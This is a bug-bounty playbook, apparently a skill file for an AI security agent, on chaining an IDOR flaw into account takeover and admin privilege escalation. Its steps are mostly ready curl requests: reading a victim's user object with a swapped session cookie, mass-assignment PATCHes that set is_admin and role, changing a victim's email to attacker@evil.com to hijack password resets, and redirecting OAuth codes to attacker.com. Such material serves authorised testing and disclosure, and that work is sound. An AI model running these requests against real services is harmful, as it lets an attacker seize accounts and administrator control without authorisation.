---
name: idor-to-priv-esc
description: Chain playbook — turn a horizontal IDOR into full account takeover and vertical privilege escalation. Covers the password-reset pivot, role-assignment mass assignment, OAuth state abuse, and the JWT-claim-forgery follow-up.
---

# Chain: IDOR → Account Takeover → Admin

Low-severity IDOR findings are bounty landmines — they're usually
triaged as "medium informational" unless you chain them to actual
account takeover. This playbook compresses the chain work.

## Pivot graph

```
IDOR (horizontal read)
   │
   ├─▶ Read password reset token field → takeover victim account
   │
   ├─▶ Read 2FA secret field → bypass MFA → takeover
   │
   ├─▶ Read session token field → replay → takeover
   │
   ├─▶ Read API key field → authenticated-as-victim for all API calls
   │
   ├─▶ Read OAuth refresh token → long-lived access even after password reset
   │
   └─▶ Read invite/magic-link field → finalise account that was meant for someone else

IDOR (horizontal write)
   │
   ├─▶ Write `email` field on victim → trigger password reset → takeover
   │
   ├─▶ Write `phone` on victim → SMS 2FA now goes to attacker
   │
   ├─▶ Write `role` / `is_admin` (mass assignment) → vertical escalation
   │
   └─▶ Write OAuth redirect_uri → auth-code interception on next login
```

## Step 1 — fingerprint the object schema

If you can read the victim's user object, enumerate which fields come back:

```bash
curl -b "session=VICTIM_SWAPPED_COOKIE" https://target.com/api/users/<victim_id>
```

Look for:
- `password_reset_token`, `reset_token`, `temp_token`, `pwd_reset`
- `two_factor_secret`, `totp_secret`, `mfa_secret`
- `api_key`, `personal_access_token`
- `oauth_refresh_token`, `refresh_token`
- `role`, `is_admin`, `is_staff`, `groups`, `permissions`

Even if the UI hides these fields, the JSON response often includes
everything because serializers default to all model fields.

## Step 2 — mass-assignment check on write endpoints

```bash
# Baseline
curl -b sessionA -X PATCH /api/users/me -d '{"display_name":"normal"}'

# Attempt escalation
curl -b sessionA -X PATCH /api/users/me -d '{"display_name":"test","is_admin":true,"role":"admin","groups":["admin"]}'

# Confirm
curl -b sessionA /api/users/me
```

Every value that round-trips unchanged is a working mass-assignment path.

## Step 3 — password reset via email swap

The dominant ATO chain of 2025-2026:

```bash
# 1. Confirm write-email IDOR
curl -b sessionA -X PATCH /api/users/<victim_id> -d '{"email":"attacker@evil.com"}'

# 2. Trigger password reset for the victim
curl -X POST /api/password-reset -d '{"email":"attacker@evil.com"}'
# The app looks up the user by email → finds victim's row → emails attacker

# 3. Receive reset email, set new password, log in as victim
```

## Step 4 — OAuth redirect_uri swap

```bash
# Some apps let tenants configure their own OAuth client. IDOR on
# tenant config → change redirect_uri → intercept any subsequent
# auth code flow.
curl -b sessionA -X PATCH /api/tenants/<victim_tenant>/oauth \
  -d '{"redirect_uri":"https://attacker.com/cb"}'
```

## Step 5 — graph the chain

```
entrypoint (authed user with sessionA)
  ─enables→ vulnerability (IDOR on PATCH /users/{id})
       ─enables→ vulnerability (password reset email spoofing)
             ─leaks→ credential (victim's password reset token)
                    ─grants→ crown_jewel (victim's account / admin panel)
```

All edges 0.3-0.5 weight — these chains are very cheap once the IDOR
exists. Run `plan_attack_chains(promote=True)` to persist.

## Step 6 — CVSS

| Final impact                              | Vector                                      | Score |
|-------------------------------------------|----------------------------------------------|-------|
| Single-user ATO (victim only)             | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N          | 8.1   |
| Admin ATO via mass assignment             | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H          | 10.0  |
| Cross-tenant data exfiltration            | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N          | 8.7   |

## Step 7 — report

Triagers want the *shortest* reproduction: two accounts, three
requests, one success page. Include:
- HTTP request/response for each step
- Screenshot of the successful "logged in as victim" state
- A concrete remediation (ownership-check code snippet)
